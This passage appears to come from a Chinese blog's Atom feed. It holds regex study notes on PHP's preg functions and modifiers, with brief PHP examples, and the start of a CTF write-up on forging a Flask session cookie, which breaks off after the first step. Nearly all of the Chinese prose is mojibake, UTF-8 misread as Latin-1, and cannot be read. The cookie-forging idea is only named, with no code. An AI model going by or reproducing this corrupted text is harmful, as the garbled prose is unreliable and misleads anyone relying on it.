·çš„å‰ç¼€ï¼Œè€Œä¸”å±æ€§ä¸æ”¯æŒé•¿åç§°ï¼Œä¾‹å¦‚åªèƒ½å†™ä½œ\pLï¼Œä¸æ”¯æŒ\p{Letter}</p><p>PHPæ”¯æŒ<strong>\p{L&amp;}</strong>(ç­‰ä»·äº[\p{Lu}\p{Ll}\p{Lt}])<strong>å’Œ\p{Any}</strong>(è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼‰</p><p>4.é»˜è®¤æƒ…å†µä¸‹pregçš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼Œæ‰€ä»¥\Cç­‰ä»·äº(?s:.),ä¸è¿‡å¦‚æœä½¿ç”¨äº†ä¿®é¥°ç¬¦u,pregå°±ä¼šè‡ªåŠ¨å˜ä¸ºä»¥UTF-8å­—æ¯ä¸ºå•ä½ï¼Œå³ä¸€ä¸ªå­—ç¬¦æœ€å¤šå¯èƒ½6ä¸ªå­—èŠ‚ç»„æˆã€‚ä½†æ˜¯\Cä»åŒ¹é…å•ä¸ªå­—èŠ‚</p><p>5.\zå’Œ\Zéƒ½å¯ä»¥åŒ¹é…å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œ\ZåŒæ ·èƒ½å¤ŸåŒ¹é…æœ€å¥½çš„æ¢è¡Œç¬¦</p><p>è€Œ$(åŒ¹é…è¡Œæœ«ï¼‰çš„æ„ä¹‰åˆ™ä¼šéšç€æ¨¡å¼ä¿®é¥°ç¬¦å˜åŒ–ï¼ˆmå’ŒDï¼‰ï¼Œ</p><p>åœ¨æ²¡æœ‰è®¾å®šä»»ä½•ä¿®é¥°ç¬¦æ—¶$ç­‰ä»·äº\Z</p><p>å¦‚æœä½¿ç”¨äº†mï¼Œåˆ™å®ƒå¯ä»¥åŒ¹é…å†…åµŒçš„æ¢è¡Œç¬¦ï¼ˆé‚£é“é¢˜çš„è§£é¢˜å…³é”®ï¼‰</p><p>å¦‚æœä½¿ç”¨äº†æ¨¡å¼ä¿®é¥°ç¬¦Dï¼Œå®ƒèƒ½å¤ŸåŒ¹é…\zï¼ˆåªæœ‰åœ¨å­—ç¬¦ä¸²çš„ç»“å°¾ï¼‰</p><p>å¦‚æœåŒæ—¶è®¾ç½®äº†må’ŒDåˆ™è§†ä¸ºm</p><p>6.é€†åºç¯è§†ç»“æ„ä½¿ç”¨çš„å­è¡¨è¾¾å¼åªèƒ½åŒ¹é…å›ºå®šé•¿åº¦çš„æ–‡æœ¬ï¼Œé™¤éé¡¶å±‚å¤šé€‰åˆ†æ”¯å®¹è®¸ä¸åŒçš„å›ºå®šé•¿åº¦</p><p>7.æ¨¡å¼ä¿®é¥°ç¬¦xï¼ˆè‡ªç”±æ ¼å¼å’Œæ³¨é‡Šï¼‰åªèƒ½è¯†åˆ«ASCIIçš„ç©ºç™½å­—ç¬¦ï¼Œä¸èƒ½è¯†åˆ«Unicodeä¸­çš„ç©ºç™½å­—ç¬¦ã€‚</p><h2 id="åˆ†éš”ç¬¦"><a href="#åˆ†éš”ç¬¦" class="headerlink" title="åˆ†éš”ç¬¦"></a>åˆ†éš”ç¬¦</h2><p>pregè¦æ±‚æ­£åˆ™è¡¨è¾¾å¼ä¸¤ä¾§å¿…é¡»è¦æœ‰åˆ†éš”ç¬¦ï¼Œå¸¸è§çš„åšæ³•æ˜¯æŠŠæ–œçº¿ä½œä¸ºåˆ†éš”ç¬¦ï¼ˆæ³¨æ„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é™¤å­—æ¯ã€æ•°å­—ã€åæ–œçº¿å’Œç©ºç™½å­—ç¬¦å¤–çš„ä»»æ„ASCIIå­—ç¬¦åšé£æ ¼ç¬¦ï¼‰ï¼Œå¸¸è§çš„æ˜¯ä¸€å¯¹æ–œçº¿ï¼Œä¹Ÿæœ‰ä½¿ç”¨!å’Œ#ä½œä¸ºåˆ†éš”ç¬¦çš„</p><h2 id="PHPç‰¹æœ‰çš„ä¿®é¥°ç¬¦"><a href="#PHPç‰¹æœ‰çš„ä¿®é¥°ç¬¦" class="headerlink" title="PHPç‰¹æœ‰çš„ä¿®é¥°ç¬¦"></a>PHPç‰¹æœ‰çš„ä¿®é¥°ç¬¦</h2><p>é™¤å››ç§æ ‡å‡†ä¿®é¥°ç¬¦é‡Œçš„æ¨¡å¼ä¿®é¥°ç¬¦å¤–(iã€sã€mã€x)</p><p>ä¿®é¥°ç¬¦eåªç”¨äºpreg_replace,å…·ä½“å¯ä»¥çœ‹å‡½æ•°preg_replaceéƒ¨åˆ†</p><h3 id="æ¨¡å¼ä¿®é¥°ç¬¦u"><a href="#æ¨¡å¼ä¿®é¥°ç¬¦u" class="headerlink" title="æ¨¡å¼ä¿®é¥°ç¬¦u"></a>æ¨¡å¼ä¿®é¥°ç¬¦u</h3><p>ä»¥utf-8ç¼–ç å¤„ç†æ­£åˆ™è¡¨è¾¾å¼å’Œç›®æ ‡å­—ç¬¦ä¸²ï¼Œæ­¤æ¨¡å¼ä¸ä¼šä¿®æ”¹æ•°æ®ï¼Œåªæ˜¯æ›´æ”¹å¤„ç†æ•°æ®çš„æ–¹å¼ï¼Œåœ¨utf-8ç¼–ç ä¸­ï¼ŒéASCIIå­—ç¬¦ä»¥å¤šä¸ªå­—èŠ‚æ¥å‚¨å­˜ï¼Œä½¿ç”¨uä¿®é¥°ç¬¦èƒ½å¤Ÿç¡®ä¿å¤šä¸ªå­—èŠ‚ä¼šä½œä¸ºå•ä¸ªå­—ç¬¦æ¥å¤„ç†ã€‚</p><h3 id="æ¨¡å¼ä¿®é¥°ç¬¦X"><a href="#æ¨¡å¼ä¿®é¥°ç¬¦X" class="headerlink" title="æ¨¡å¼ä¿®é¥°ç¬¦X"></a>æ¨¡å¼ä¿®é¥°ç¬¦X</h3><p>å¯åŠ¨PCREçš„é¢å¤–åŠŸèƒ½ï¼Œç›®å‰å®ƒåªæœ‰ä¸€ä¸ªæ•ˆæœï¼Œå¦‚æœå‡ºç°äº†æ— æ³•è¯†åˆ«çš„åæ–œçº¿ï¼Œå°±æŠ¥å‘Šé”™è¯¯ã€‚ä¾‹å¦‚ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ\kåœ¨PCREä¸­æ²¡æœ‰ç‰¹æ®Šæ„ä¹‰ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¼šè¢«çœ‹ä½œkï¼Œå¦‚æœä½¿ç”¨äº†æ¨¡å¼ä¿®é¥°ç¬¦Xï¼Œå°±ä¼šæŠ¥å‘Šâ€™unrecognized character follows  \â€</p><h3 id="æ¨¡å¼ä¿®é¥°ç¬¦S"><a href="#æ¨¡å¼ä¿®é¥°ç¬¦S" class="headerlink" title="æ¨¡å¼ä¿®é¥°ç¬¦S"></a>æ¨¡å¼ä¿®é¥°ç¬¦S</h3><p>è°ƒç”¨PCREçš„ç ”ç©¶(study)ç‰¹æ€§ï¼Œé¢„å…ˆåˆ†ææ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨æŸäº›é¡ºåˆ©æƒ…å†µä¸‹ï¼Œåœ¨å°è¯•åŒ¹é…æ—¶é€Ÿåº¦ä¼šå¤§å¤§æå‡ã€‚</p><h3 id="ä¸å¸¸ç”¨çš„æ¨¡å¼ä¿®é¥°ç¬¦"><a href="#ä¸å¸¸ç”¨çš„æ¨¡å¼ä¿®é¥°ç¬¦" class="headerlink" title="ä¸å¸¸ç”¨çš„æ¨¡å¼ä¿®é¥°ç¬¦"></a>ä¸å¸¸ç”¨çš„æ¨¡å¼ä¿®é¥°ç¬¦</h3><p>æ¨¡å¼ä¿®é¥°ç¬¦A æŠŠåŒ¹é…é”šå®šå†ç¬¬ä¸€æ¬¡å°è¯•çš„ä½ç½®ï¼Œå°±ç­‰äºæ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä»¥\Gå¼€å¤´</p><p>æ¨¡å¼ä¿®é¥°ç¬¦D ä¼šæŠŠæ¯ä¸ª$æ›¿æ¢æˆ\zï¼Œå³$åŒ¹é…å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²ä¹‹å†…çš„æ¢è¡Œç¬¦</p><p>æ¨¡å¼ä¿®é¥°ç¬¦Uäº¤æ¢å…ƒå­—ç¬¦çš„åŒ¹é…ä¼˜å…ˆå«ä¹‰ï¼š<em>å’Œ</em>?äº¤æ¢ï¼Œï¼ˆå®Œå…¨ä¸çŸ¥é“è¿™ä¸ªæ˜¯æ‹¿æ¥å¹²ä»€ä¹ˆçš„ï¼Œæ„Ÿè§‰ä¸€ç‚¹ç”¨éƒ½æ²¡æœ‰ï¼‰</p><h2 id="Pregå‡½æ•°"><a href="#Pregå‡½æ•°" class="headerlink" title="Pregå‡½æ•°"></a>Pregå‡½æ•°</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><p>preg_match(pattern,subject[,matches[,flags[,offset]]])</p><p>æµ‹è¯•æ­£åˆ™è¡¨è¾¾å¼èƒ½å¦åœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°åŒ¹é…ï¼Œå¹¶æå–æ•°æ®</p><p><strong>å‚æ•°</strong></p><p>pattern åˆ†éš”ç¬¦åŒ…å›´èµ·æ¥çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯èƒ½æœ‰ä¿®é¥°ç¬¦</p><p>subjuct éœ€è¦è¿›è¡Œæœç´¢çš„ç›®æ ‡å­—ç¬¦ä¸²</p><p>matches éå¿…è¦ï¼Œç”¨æ¥æ¥å—åŒ¹é…æ•°æ®</p><p>flags éå¿…è¦ï¼Œæ­¤æ ‡å¿—ä½ä¼šå½±å“æ•´ä¸ªå‡½æ•°çš„è¡Œä¸ºï¼Œè¿™é‡Œåªå®¹è®¸å‡ºç°ä¸€ä¸ªæ ‡å¿—ä½</p><p>offset éå¿…è¦ï¼Œä»0å¼€å§‹ï¼Œè¡¨ç¤ºå¼€å§‹åŒ¹é…çš„ä½ç½®</p><p><strong>è¿”å›å€¼</strong></p><p>æˆåŠŸåŒ¹é…è¿”å›trueå¦åˆ™è¿”å›false</p><h3 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h3><p>preg_match_all(pattern,subject,matches[,flags[,offset]])</p><p>åœ¨å­—ç¬¦ä¸²ä¸­æå–æ•°æ®</p><p><strong>å‚æ•°</strong></p><p>pattern åˆ†éš”ç¬¦åŒ…å›´èµ·æ¥çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯èƒ½æœ‰ä¿®é¥°ç¬¦</p><p>subjuct éœ€è¦è¿›è¡Œæœç´¢çš„ç›®æ ‡å­—ç¬¦ä¸²</p><p>matches å¿…è¦ï¼Œç”¨æ¥æ¥å—åŒ¹é…æ•°æ®ï¼ˆå’Œpreg_matchä¸åŒçš„åœ°æ–¹ï¼‰</p><p>flags éå¿…è¦ï¼Œæ­¤æ ‡å¿—ä½ä¼šå½±å“æ•´ä¸ªå‡½æ•°çš„è¡Œä¸ºï¼Œè¿™é‡Œåªå®¹è®¸å‡ºç°ä¸€ä¸ªæ ‡å¿—ä½</p><p>offset éå¿…è¦ï¼Œä»0å¼€å§‹ï¼Œè¡¨ç¤ºå¼€å§‹åŒ¹é…çš„ä½ç½®</p><p><strong>è¿”å›å€¼</strong></p><p>preg_match_allè¿”å›åŒ¹é…çš„æ¬¡æ•°</p><p>preg_match_allå¯ä»¥ä»¥ä¸¤ç§æ–¹å¼åœ¨$all_matchesä¸­å­˜æ”¾æ•°æ®ï¼Œç”±å‚æ•°flagå†³å®š</p><p>flag:PREG_PATTERN_ORDERæˆ–æ˜¯PREG_SET_ORDERæ¥å†³å®š</p><p>é»˜è®¤çš„æ’åˆ—æ–¹å¼æ˜¯PREG_PATTERN_ORDER</p><p>ä¸‹é¢æ˜¯ä¹¦ä¸­çš„ä¾‹å­</p><p><img src="https://i.loli.net/2021/03/06/F3LmndhNDg4U1BZ.png" alt="Untitled 6.png"></p><p>è€Œå¦‚æœä½¿ç”¨PREG_SET_ORDERåˆ™ä¼šè¿”å›ä¸‹é¢è¿™ä¸ªæ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>( <span class="number">0</span> =&gt; <span class="string">&quot;Jack A. Smith&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Jack&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;A.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&quot;Mary B. Miller&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Mary&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;B.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Miller&quot;</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>preg_replace(pattern,replacement,subject[,limit[,count]]}</p><p>åœ¨å­—ç¬¦ä¸²çš„å‰¯æœ¬ä¸­æ›¿æ¢åŒ¹é…çš„æ–‡æœ¬</p><p><strong>å‚æ•°</strong></p><p>pattern åˆ†éš”ç¬¦åŒ…å›´èµ·æ¥çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯èƒ½æœ‰ä¿®é¥°ç¬¦</p><p>replacement replacementå­—ç¬¦ä¸²ï¼Œå¦‚æœpatternæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåˆ™replacementæ˜¯åŒ…å«å¤šä¸ªå­ç¬¦ ä¸²çš„æ•°ç»„ï¼Œå¦‚æœä½¿ç”¨äº†æ¨¡å¼ä¿®é¥°ç¬¦eï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«å½“ä½œphpä»£ç </p><p>subjuct éœ€è¦è¿›è¡Œæ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯æ•°ç»„</p><p>limit éå¿…è¦ï¼Œæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ›¿æ¢å‘ç”Ÿçš„ä¸Šé™</p><p>count éå¿…è¦ï¼Œç”¨æ¥ä¿å­˜å®é™…è¿›è¡Œçš„æ›¿æ¢æ¬¡æ•°ï¼ˆåªæœ‰php5æä¾›ï¼‰</p><p><strong>è¿”å›å€¼</strong></p><p>å½“subjectæ˜¯å•ä¸ªå­—ç¬¦æ—¶ï¼Œåˆ™è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆsubjectå¯èƒ½è¢«ä¿®æ”¹åçš„å‰¯æœ¬ï¼‰</p><p>å½“subjectæ˜¯æ•°ç»„æ—¶åˆ™è¿”å›æ•°ç»„</p><p>Patternå’Œreplacementå¯ä»¥ä»¥(å­—ç¬¦ä¸²ã€å­—ç¬¦ä¸²) (æ•°ç»„ï¼Œå­—ç¬¦ä¸²) (å­—ç¬¦ä¸²ï¼Œæ•°ç»„)</p><p>å¦‚æœä½¿ç”¨äº†æ¨¡å¼ä¿®é¥°ç¬¦eï¼Œreplacementå­—ç¬¦ä¸²çš„æ•è·å¼•ç”¨ä¼šæŒ‰ç…§ç‰¹æ®Šçš„è§„å®šæ¥æ’å€¼ï¼šæ’å€¼ä¸­çš„å¼•å·ï¼ˆå•å¼•å·å’ŒåŒå¼•å·ï¼‰ä¼šè½¬ä¹‰ã€‚å¦‚æœä¸è¿™æ ·å¤„ç†ï¼Œæ’å…¥çš„æ•°å€¼ä¸­çš„å¼•å·ä¼šè®©PHPä»£ç å‡ºé”™ã€‚</p><h3 id="preg-replace-callback"><a href="#preg-replace-callback" class="headerlink" title="preg_replace_callback"></a>preg_replace_callback</h3><p>preg_replace_callback(pattern,callback,subject[,limit[,count]])</p><p>å¯¹å­—ç¬¦ä¸²ä¸­çš„æ¯å¤„åŒ¹é…æ–‡æœ¬è°ƒç”¨å¤„ç†å‡½æ•°</p><p><strong>å‚æ•°</strong></p><p>pattern åˆ†éš”ç¬¦åŒ…å›´èµ·æ¥çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯èƒ½æœ‰ä¿®é¥°ç¬¦</p><p>callback PHPå›è°ƒå‡½æ•°ï¼Œæ¯æ¬¡åŒ¹é…æˆåŠŸï¼Œå°±æ‰§è¡Œå®ƒï¼Œç”Ÿæˆreplacementå­—ç¬¦ä¸²</p><p>subjuct éœ€è¦è¿›è¡Œæ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯æ•°ç»„</p><p>limit éå¿…è¦ï¼Œæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ›¿æ¢å‘ç”Ÿçš„ä¸Šé™</p><p>count éå¿…è¦ï¼Œç”¨æ¥ä¿å­˜å®é™…è¿›è¡Œçš„æ›¿æ¢æ¬¡æ•°ï¼ˆåªæœ‰php5æä¾›ï¼‰</p><p><strong>è¿”å›å€¼</strong></p><p>å½“subjectæ˜¯å•ä¸ªå­—ç¬¦æ—¶ï¼Œåˆ™è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆsubjectå¯èƒ½è¢«ä¿®æ”¹åçš„å‰¯æœ¬ï¼‰</p><p>å½“subjectæ˜¯æ•°ç»„æ—¶åˆ™è¿”å›æ•°ç»„</p><h3 id="preg-split"><a href="#preg-split" class="headerlink" title="preg_split"></a>preg_split</h3><p>preg_split(pattern,subject[,limit,[flags]])</p><p>å°†å­—ç¬¦ä¸²åˆ‡åˆ†ä¸ºå­ä¸²æ•°ç»„</p><p><strong>å‚æ•°</strong></p><p>pattern åˆ†éš”ç¬¦åŒ…å›´èµ·æ¥çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯èƒ½æœ‰ä¿®é¥°ç¬¦</p><p>subjuct éœ€è¦è¿›è¡Œåˆ†å‰²çš„ç›®æ ‡å­—ç¬¦ä¸²</p><p>limit éå¿…è¦ï¼Œæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºåˆ‡åˆ†ä¹‹åå…ƒç´ çš„ä¸Šé™</p><p>flags éå¿…è¦ï¼Œæ­¤æ ‡å¿—ä½ä¼šå½±å“æ•´ä¸ªå‡½æ•°çš„è¡Œä¸ºï¼Œä»¥ä¸‹ä¸‰ç§å¯ä»¥éšæ„ç»„åˆ</p><p>PREG_SPLIT_NO_EMPLY</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p><strong>è¿”å›å€¼</strong></p><p>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„</p><p><strong>flagå‚æ•°</strong></p><p>ä¸‰ä¸ªæ ‡å¿—ä½éƒ½ä¼šå½±å“å‡½æ•°çš„åŠŸèƒ½ï¼Œå®ƒä»¬å¯ä»¥å•ç‹¬ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨orè¿æ¥</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p>ç±»ä¼¼äºpreg_match_allä¸­çš„PREG_OFFSET_CAPTUREï¼Œè¿™ä¸ªæ ‡å¿—ä½ä¼šä¿®æ”¹ç»“æœæ•°ç»„ï¼ŒæŠŠæ¯ä¸ªå…ƒç´ å˜ä¸ºåŒ…å«ä¸¤ä¸ªå…ƒç´ çš„æ•°ç»„</p><p>PREG_SPLIT_NO_EMPLY</p><p>è¿™ä¸ªæ ‡å¿—ä½è®¾å®šåpreg_splitä¼šå¿½ç•¥ç©ºå­—ç¬¦ä¸²ï¼Œä¸æŠŠå®ƒä»¬æ”¾åœ¨è¿”å›æ•°ç»„ä¸­ï¼Œä¹Ÿä¸è®¡å…¥limitçš„ç»Ÿè®¡ä¸­ã€‚</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>è¿™ä¸ªæ ‡å¿—ä½åœ¨ç»“æœä¸­åŒ…å«åŒ¹é…çš„æ–‡æœ¬ï¼Œä»¥åŠè¿›è¡Œæ­¤æ¬¡åˆ‡åˆ†çš„æ­£åˆ™è¡¨è¾¾å¼çš„æ•è·æ‹¬å·åŒ¹é…çš„æ–‡æœ¬ï¼Œä¸‹é¢ç”¨ä¾‹å­è¯´æ˜</p><p>å­—ç¬¦ä¸²å¦‚ä¸‹ï¼Œè€Œä¸”æ˜¯ç”¨orå’Œandæ¥è¿æ¥çš„</p><p>DLSR camera and Nikon D200 or Canon EOS 30D</p><p>åœ¨ä¸ä½¿ç”¨PREG_SPLIT_DELIM_CAPTUREçš„æƒ…å†µä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;DLSR camera&#x27;,&#x27;Nikon D200&#x27;,&#x27;Canon EOS 30D&#x27;)</span></span><br></pre></td></tr></table></figure><p>åˆ†éš”ç¬¦å†…å®¹è¢«å»æ‰äº†ï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨äº†PREG_SPLIT_DELIM_CAPTUREå‘¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>,<span class="number">-1</span>,PREG_SPLIT_DELIM_CAPTURE);</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå³åˆ†éš”ç¬¦ä¹Ÿè¢«åŒ…æ‹¬è¿›å»äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;DLSR camera&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;Nikon D200&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;Canon EOS 30D&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="prep-grep"><a href="#prep-grep" class="headerlink" title="prep_grep"></a>prep_grep</h3><p>preg_grep(pattern,input[,flags])</p><p>é€‰å‡ºæ•°ç»„ä¸­èƒ½ï¼ˆä¸èƒ½ï¼‰ç”±è¡¨è¾¾å¼åŒ¹é…çš„å…ƒç´ </p><p><strong>å‚æ•°</strong></p><p>pattern åˆ†éš”ç¬¦åŒ…å›´èµ·æ¥çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯èƒ½æœ‰ä¿®é¥°ç¬¦</p><p>input ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœå®ƒä»¬çš„å€¼èƒ½å¤ŸåŒ¹é…patternï¼Œåˆ™å…¶å€¼ä¼šå¤åˆ¶åˆ°è¿”å›çš„æ•°ç»„ä¸­ã€‚</p><p>flags éå¿…è¦ï¼Œæ­¤æ ‡å¿—ä½PREG_GREF_INVERTæˆ–è€…æ˜¯0</p><p><strong>è¿”å›å€¼</strong></p><p>ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«inputä¸­èƒ½å¤Ÿç”±patternåŒ¹é…çš„å…ƒç´ (å¦‚æœä½¿ç”¨äº†PREG_GREF_INVERTæ ‡å¿—ä½ï¼Œåˆ™åŒ…æ‹¬ä¸èƒ½åŒ¹é…çš„å…ƒç´ )</p><h3 id="preg-quote"><a href="#preg-quote" class="headerlink" title="preg_quote"></a>preg_quote</h3><p>preg_quote(input[,delimiter])</p><p>è½¬ä¹‰å­—ç¬¦ä¸²ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å…ƒå­—ç¬¦</p><p><strong>å‚æ•°</strong></p><p>input å¸Œæœ›ä»¥æ–‡å­—æ–¹å¼ç”¨ä½œpatternå‚æ•°çš„å­—ç¬¦ä¸²</p><p>delimiter éå¼ºåˆ¶å‡ºç°çš„å‚æ•°ï¼ŒåŒ…å«1ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå¸Œæœ›ç”¨åœ¨patternå‚æ•°çš„åˆ†éš”ç¬¦</p><p><strong>è¿”å›å€¼</strong></p><p>preg_quoteè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯inputçš„å‰¯æœ¬ï¼Œå…¶ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å…ƒå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œå¦‚æœæŒ‡å®šäº†åˆ†éš”ç¬¦ï¼Œåˆ™åˆ†éš”ç¬¦æœ¬èº«ä¹Ÿä¼šè¢«è½¬ä¹‰ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;èµ·å› æ˜¯æœ€è¿‘åšä¸€é“æ–‡ä»¶åŒ…å«çš„ctfé¢˜ç›®æ—¶ï¼Œå¡äº†å¾ˆä¹…ï¼Œæœ€åæ‰å‘ç°æ˜¯å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„ç†è§£æœ‰é—®é¢˜å¯¼è‡´ï¼Œå®³ï¼Œå¤ªèœäº†ï¼Œæœ€ååæ€äº†ä¸€ä¸‹è¿˜æ˜¯æ²¡æœ‰å¥½å¥½å­¦ä¹ æ­£åˆ™è¡¨è¾¾å¼ï¼ˆå°¤å…¶æ˜¯æ²¡æœ‰ç³»ç»Ÿçš„è¿›è¡Œå­¦ä¹ ï¼‰ï¼Œäºæ˜¯å†³å®šç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ¬¡å­¦ä¹ ä½¿ç”¨çš„å­¦ä¹ èµ„æ–™ä¸ºã€Šç²¾é€šæ­£åˆ™è¡¨è¾¾å¼(ç¬¬ä¸‰ç‰ˆ)</summary>
      
    
    
    
    <category term="åŸºç¡€å­¦ä¹ " scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="æ­£åˆ™è¡¨è¾¾å¼" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
    <category term="æ­£åˆ™è¡¨è¾¾å¼" scheme="http://www.fxizenta.design/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€é“flaskçš„wp</title>
    <link href="http://www.fxizenta.design/2021/03/01/awp_for_falsk/"/>
    <id>http://www.fxizenta.design/2021/03/01/awp_for_falsk/</id>
    <published>2021-03-01T08:24:46.000Z</published>
    <updated>2021-07-23T09:04:17.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸€é“flaskçš„wp"><a href="#ä¸€é“flaskçš„wp" class="headerlink" title="ä¸€é“flaskçš„wp"></a>ä¸€é“flaskçš„wp</h1><p>æœ¬é¢˜ä¸ºæ ¡å†…ä¸€ä¸ªå¸ˆå…„å‡ºçš„é¢˜ï¼Œåœ¨æœ¬åœ°æ­å¥½äº†ç¯å¢ƒè¿›è¡Œè¯•éªŒã€‚</p><h2 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a><strong>ç¬¬ä¸€æ­¥</strong></h2><p>è¿›å…¥é¢˜ç›®å‘ç°ä¸€ä¸ªä¸Šä¼ ç‚¹å’Œæç¤ºâ€œI will tell you a secret, but you should become admin first.â€ï¼Œæ ¹æ®æç¤ºå¯ä»¥çŒœæƒ³åˆ°å¾—å…ˆæƒ³åŠæ³•ä»¥adminèº«ä»½ç™»å½•ï¼ŒæŸ¥çœ‹cookieå¯ä»¥çœ‹åˆ°sessionï¼Œå€¼ä¸ºç–‘ä¼¼base64çš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œdecodeä¹‹åä¸ºç±»ä¼¼{â€œusernameâ€:â€2333â€}çš„ä¿¡æ¯ï¼Œåº”è¯¥ä½¿ç”¨çš„æ˜¯securecookieæœºåˆ¶ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°ç­¾åçš„keyå’Œç­¾åæ–¹æ³•ç­‰ç›¸å…³ä¿¡æ¯å°±èƒ½æƒ³åŠæ³•ä¼ªé€ 